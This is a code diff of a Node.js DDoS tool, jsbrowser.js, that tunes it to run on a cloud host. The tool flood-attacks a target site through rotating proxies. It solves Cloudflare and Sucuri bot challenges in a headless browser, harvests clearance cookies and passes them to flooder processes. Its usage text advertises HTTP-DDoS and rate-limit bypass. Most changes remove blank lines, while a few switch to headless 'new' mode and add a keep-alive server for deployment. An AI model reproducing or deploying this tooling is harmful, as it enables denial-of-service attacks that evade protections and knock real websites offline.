@@ -13,7 +13,6 @@ process.on("uncaughtException", function (error) {});
 process.on("unhandledRejection", function (error) {});
 process.setMaxListeners(0);
 
-
 if (process.argv.length < 7) {
     console.clear();
     console.log(`
@@ -40,11 +39,9 @@ if (process.argv.length < 7) {
           --bypass true/false - Enable HTTP-DDOS bypass and ratelimit bypass (${colors.yellow.bold(`default`)}: false)
       ${colors.magenta.bold(`EXAMPLE`)}:
           node jsbrowser.js https://www.target.com 250 8 64 output.txt --debug true --flooder true 
-
 `);
     process.exit(0);
 }
-
 
 const target = process.argv[2];
 const duration = parseInt(process.argv[3]);
@@ -64,24 +61,21 @@ if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
     seconds = "undefined";
 }
 
-
 function error(msg) {
     console.log(` ${'['.red}${'error'.bold}${']'.red} ${msg}`);
     process.exit(0);
 }
-
 
 function get_option(flag) {
     const index = process.argv.indexOf(flag);
     return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
 }
 
-
 function exit() {
     for (const flooder of flooders) {
         flooder.kill();
     }
-    exec('pkill -f chrome');
+    // Không dùng exec('pkill -f chrome') trên Render
     log(1, `${'JsBrowser & JsFlooder Has End'.bold}`);
     
     if (fs.existsSync('cookie_count.txt')) {
@@ -97,7 +91,6 @@ process.on('SIGTERM', () => {
     exit();
 });
 
-
 const options = [
     { flag: '--auth', value: get_option('--auth'), default: false },
     { flag: '--cookies', value: get_option('--cookies'), default: 0 },
@@ -112,7 +105,6 @@ const options = [
     { flag: '--randrate', value: get_option('--randrate'), default: false },
     { flag: '--randpath', value: get_option('--randpath'), default: false },
 ];
-
 
 function enabled(buf) {
     var flag = `--${buf}`;
@@ -139,11 +131,8 @@ function enabled(buf) {
     }
 }
 
-
 const raw_proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
 var parsed = new URL(target);
-//var parsed = new URL(target);
-
 
 function shuffle_proxies(array) {
     for (let i = array.length - 1; i > 0; i--) {
@@ -152,7 +141,6 @@ function shuffle_proxies(array) {
     }
     return array;
 }
-
 
 const proxies = shuffle_proxies(raw_proxies);
 let liveProxies = [];
@@ -169,8 +157,6 @@ var delayFlood = enabled('delay');
 var randmethod = enabled('randmethod');
 var randpath = enabled('randpath');
 var randrate = enabled('randrate');
-
-
 
 let proxyStats = {};
 
@@ -208,7 +194,6 @@ function getProxyQuality(proxy) {
     
     return 'poor';
 }
-
 
 async function verifyProxy(proxy) {
     let proxy_host, proxy_port, username, password;
@@ -250,7 +235,6 @@ async function verifyProxy(proxy) {
     }
 }
 
-
 async function collectLiveProxies() {
     if (!verifyProxies) {
         liveProxies = proxies.slice();
@@ -283,10 +267,8 @@ async function collectLiveProxies() {
     }
 }
 
-
 const cache = [];
 const flooders = [];
-
 
 function log(type, string) {
     let script;
@@ -308,11 +290,9 @@ function log(type, string) {
     }
 }
 
-
 function random_int(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
-
 
 function getRandomUA() {
     const windowsChromeUAs = [
@@ -326,7 +306,6 @@ function getRandomUA() {
     return windowsChromeUAs[Math.floor(Math.random() * windowsChromeUAs.length)];
 }
 
-
 let lastLogTime = 0;
 const LOG_INTERVAL = 8000;
 
@@ -339,7 +318,6 @@ function throttledLog(type, string) {
     }
 }
 
-
 function get_count() {
     if (!fs.existsSync('cookie_count.txt')) {
         return 0;
@@ -347,12 +325,10 @@ function get_count() {
     return parseInt(fs.readFileSync('cookie_count.txt', 'utf-8') || '0');
 }
 
-
 function increment_count() {
     let c = get_count();
     fs.writeFileSync('cookie_count.txt', (c + 1).toString());
 }
-
 
 async function flooder(proxy, ua, cookie) {
     let args;
@@ -446,10 +422,8 @@ async function flooder(proxy, ua, cookie) {
     });
 }
 
-
 async function isChallengeSolved(page, protections) {
     try {
-        
         const cookiesCheck = await page.evaluate(() => {
             const cfClearance = document.cookie.split(';').find(row => row.startsWith('cf_clearance='));
             const cfBM = document.cookie.split(';').find(row => row.startsWith('__cf_bm='));
@@ -457,7 +431,6 @@ async function isChallengeSolved(page, protections) {
                    (cfBM && cfBM.split('=')[1] && cfBM.split('=')[1].length > 10);
         });
 
-        
         if (cookiesCheck) {
             const quickCheck = await page.evaluate(() => {
                 return document.readyState === 'complete' && 
@@ -467,13 +440,11 @@ async function isChallengeSolved(page, protections) {
             if (quickCheck) return true;
         }
 
-        
         const title = await page.title();
         if (title && protections.some(p => title.toLowerCase().includes(p))) {
             return false;
         }
 
-        
         const isSolved = await page.evaluate(() => {
             return document.readyState === 'complete' &&
                    !document.body.innerHTML.includes('Just a moment') &&
@@ -489,7 +460,6 @@ async function isChallengeSolved(page, protections) {
     }
 }
 
-
 async function mainLoop() {
     while (true) {
         let reserve = false;
@@ -497,13 +467,11 @@ async function mainLoop() {
     }
 }
 
-
 async function main(reserve) {
     const startTime = Date.now();
     let Page, Browser;
 
     return new Promise(async (resolve) => {
-        
         if (get_count() >= desired_cookies) {
             await timers.setTimeout(1000);
             resolve();
@@ -550,10 +518,10 @@ async function main(reserve) {
                 };
             }
 
-            
+            // --- SỬA Ở ĐÂY: dùng headless: "new" để không cần Xvfb ---
             let { page, browser } = await connect({
                 turnstile: true,
-                headless: headless,
+                headless: "new",      // <-- THAY ĐỔI CHÍNH
                 args: [
                     '--no-sandbox',
                     '--disable-setuid-sandbox',
@@ -602,7 +570,6 @@ async function main(reserve) {
                 await page.setUserAgent(userAgent);
             }
 
-            
             const proxyQuality = getProxyQuality(proxy);
             let gotoTimeout = 25000;
             let waitStrategy = 'domcontentloaded';
@@ -628,7 +595,6 @@ async function main(reserve) {
                 'Sucuri WebSite Firewall'
             ];
 
-            
             const maxWaitTime = proxyQuality === 'good' ? 30000 : 
                                proxyQuality === 'medium' ? 35000 : 40000;
             const pollInterval = 150;
@@ -722,7 +688,6 @@ async function main(reserve) {
                 return;
             }
 
-            
             await timers.setTimeout(random_int(500, 1000));
 
             var cookies = await page.cookies();
@@ -754,7 +719,6 @@ async function main(reserve) {
             updateProxyStats(proxy, true, endTime - startTime);
             increment_count();
             const totalCookies = get_count();
-            // Lấy title của trang
             const pageTitle = await page.title();
 
             console.log(`{`);
@@ -765,9 +729,7 @@ async function main(reserve) {
             console.log(`   ${chalk.black.bold.bgWhite('Time_Solver')}: ${colors.green(`${solveTime}s`)}`);
             console.log(`   ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(totalCookies)}`);
             console.log(`},`);
-/*            console.log(` ${chalk.black.bold.bgWhite('Time')}: ${colors.green(`${solveTime}s`)}`);
-            console.log(` ${chalk.black.bold.bgWhite('Total Cookies')}: ${colors.green(totalCookies)}`);
-*/
+
             await page.close();
             await browser.close();
 
@@ -797,7 +759,6 @@ async function main(reserve) {
     });
 }
 
-
 async function cacheLoop(x = 1) {
     if (x >= duration) return;
 
@@ -812,6 +773,17 @@ async function cacheLoop(x = 1) {
     setTimeout(() => cacheLoop(x + 1), 60000);
 }
 
+// --- THÊM HTTP SERVER GIỮ CỔNG MỞ CHO RENDER ---
+const http = require('http');
+const server = http.createServer((req, res) => {
+    res.writeHead(200);
+    res.end('OK');
+});
+const port = process.env.PORT || 3000;
+server.listen(port, () => {
+    console.log(`Keep-alive server running on port ${port}`);
+});
+// ----------------------------------------------
 
 if (cluster.isPrimary) {
     fs.writeFileSync('cookie_count.txt', '0');
